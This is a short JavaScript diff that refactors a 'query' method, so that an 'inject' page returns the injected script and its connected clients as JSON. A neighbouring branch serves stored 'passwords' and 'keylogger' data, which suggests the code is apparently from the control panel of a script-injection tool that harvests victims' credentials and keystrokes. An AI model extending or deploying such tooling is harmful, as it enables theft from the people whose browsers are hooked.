@@ -7,15 +7,10 @@ var default_1 = /** @class */ (function () {
     default_1.prototype.query = function (doc, page) {
         return new Promise(function (resolve, reject) {
             if (page === 'inject') {
-                if (global.inject.clients[doc._id]) {
-                    resolve(JSON.stringify({
-                        inject: doc.inject,
-                        clients: global.inject.clients[doc._id]
-                    }, null, '    '));
-                }
-                else {
-                    resolve(JSON.stringify([], null, '    '));
-                }
+                resolve(JSON.stringify({
+                    inject: doc.inject,
+                    clients: global.inject.clients[doc._id] || {}
+                }, null, '    '));
             }
             else if (doc.passwords && doc.keylogger) {
                 resolve(JSON.stringify(doc[page], null, '    '));
